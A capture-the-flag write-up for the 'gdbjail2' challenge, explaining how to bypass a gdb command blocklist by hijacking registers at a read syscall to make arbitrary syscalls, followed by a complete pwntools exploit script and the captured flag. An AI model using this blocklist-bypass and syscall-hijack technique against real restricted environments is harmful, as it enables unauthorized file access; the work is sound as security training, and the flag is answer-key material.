https://ctftime.org/event/2396

# gdbjail2 (misc)

this time with a blocklist

## Solution

The main difference in this one is the blacklist:
```python
blacklist = ["p", "-", "&", "(", ")", "[", "]", "{", "}", "0x"]
```
So we can't just set $rip.

We are debugging cat without any arguments, so it just hangs there forever waiting for input.
It takes input using the read syscall.
We can just add a breakpoint before read, change the registers and continue.
Allowing us to call any syscall that we want.

The way to find where the syscall is might be a little bit harder, I just
installed pwndbg on the Docker image, and used `stepuntilasm syscall`.
But you can also step to it or use a custom gdb script.

You can probably just call execve and be done with it.
I unfortunately chose a harder path.

1. open flag dir
2. call opendents
3. read flag filename
4. open flag
5. read flag
6. print flag from mem

Its pretty straight forward, there are two problems though.

First, The flag filename has the letter 'p' in it which is on the blacklist.
We can bypass that by using integers instead of chars, see the `alloc_str` function.

And second, finding writeable memory
We can just do `set $rax = "AAAA"`.
This gives us a heap string of any size we want.

```python
#!/usr/bin/env python3

from pwn import *

def sendfile(fd1, fd2, n):
    p.sendlineafter(b"(gdb) ", b"set $rax = 40")
    p.sendlineafter(b"(gdb) ", f"set $rdi = {fd1}".encode())
    p.sendlineafter(b"(gdb) ", f"set $rsi = {fd2}".encode())
    p.sendlineafter(b"(gdb) ", f"set $rdx = 0".encode())
    p.sendlineafter(b"(gdb) ", f"set $r10 = 64".encode())
    p.sendlineafter(b"(gdb) ", b"continue")

def dump(offset):
    p.sendlineafter(b"(gdb) ", b"set $rax = 1")
    p.sendlineafter(b"(gdb) ", b"set $rdi = 1")
    p.sendlineafter(b"(gdb) ", f"set $rsi = \"{'B'}\"".encode())
    p.sendlineafter(b"(gdb) ", f"set $r14 = 65535 * {offset}".encode())
    p.sendlineafter(b"(gdb) ", b"set $si = $si + $r14")
    p.sendlineafter(b"(gdb) ", f"set $rdx = 256".encode())
    p.sendlineafter(b"(gdb) ", b"continue")
    data = p.recv()
    print(f"DEBUGPRINT[3]: clean.py:16: p.recv()={data}")
    return data 

def write(fd, data, n):
    p.sendlineafter(b"(gdb) ", b"set $rax = 1")
    p.sendlineafter(b"(gdb) ", f"set $rdi = {fd}".encode())
    p.sendlineafter(b"(gdb) ", f"set $rsi = \"{data}\"".encode())
    p.sendlineafter(b"(gdb) ", f"set $rdx = {n}".encode())
    p.sendlineafter(b"(gdb) ", b"continue")

def _open(filename, mode):
    p.sendlineafter(b"(gdb) ", b"set $rax = 2")
    alloc_str(filename, "$rdi")
    # p.sendlineafter(b"(gdb) ", f"set $rdi = \"{filename}\"".encode())
    p.sendlineafter(b"(gdb) ", f"set $rsi = {mode}".encode())
    p.sendlineafter(b"(gdb) ", f"set $rdx = 0".encode())
    p.sendlineafter(b"(gdb) ", b"continue")

def getdents(fd, n):
    p.sendlineafter(b"(gdb) ", b"set $rax = 78")
    p.sendlineafter(b"(gdb) ", f"set $rdi = {fd}".encode())
    p.sendlineafter(b"(gdb) ", f"set $rsi = \"{'A' * 256}\"".encode())
    p.sendlineafter(b"(gdb) ", f"set $rdx = {n}".encode())
    p.sendlineafter(b"(gdb) ", b"continue")

def read(fd, n):
    p.sendlineafter(b"(gdb) ", b"set $rax = 0")
    p.sendlineafter(b"(gdb) ", f"set $rdi = {fd}".encode())
    p.sendlineafter(b"(gdb) ", f"set $rsi = \"{'A'*n}\"".encode())
    p.sendlineafter(b"(gdb) ", f"set $rdx = {n}".encode())
    p.sendlineafter(b"(gdb) ", b"continue")

def alloc_str(string, reg):
    p.sendlineafter(b"(gdb) ", f"set {reg} = \"{'A'*len(string)}\"".encode())
    p.sendlineafter(b"(gdb) ", f"set $start = {reg}".encode())

    for chunk in string:
        chunk = ord(chunk)
        p.sendlineafter(b"(gdb) ", f"set *{reg} = {chunk}".encode())
        p.sendlineafter(b"(gdb) ", f"set {reg} = {reg} + 1".encode())

    p.sendlineafter(b"(gdb) ", f"set *{reg} = 0".encode())
    p.sendlineafter(b"(gdb) ", f"set {reg} = $start".encode())

with remote("gdbjail2.chal.imaginaryctf.org", 1337) as p:
    p.recvuntil(b":25\n")

    p.sendlineafter(b"(gdb) ", b"break *write+21")
    p.sendlineafter(b"(gdb) ", b"break *write+23")
    p.sendlineafter(b"(gdb) ", b"continue")
    p.sendline(b"")

    _open(".", 0)
    p.sendlineafter(b"(gdb) ", b"continue")

    getdents(3, 256)
    p.sendlineafter(b"(gdb) ", b"continue")
    
    data = dump(300)
    idx = data.find(b'.txt')
    flag = data[idx-20:idx+4]
    p.sendlineafter(b"(gdb) ", b"continue")

    _open(flag.decode(), 0)
    p.sendlineafter(b"(gdb) ", b"continue")
    
    read(4, 64)
    p.sendlineafter(b"(gdb) ", b"continue")
    
    dump(200)
    p.sendlineafter(b"(gdb) ", b"continue")
```

## Flag
`ictf{i_l0ve_syscalls_eebc5336}`

shafouz 2024/07/21
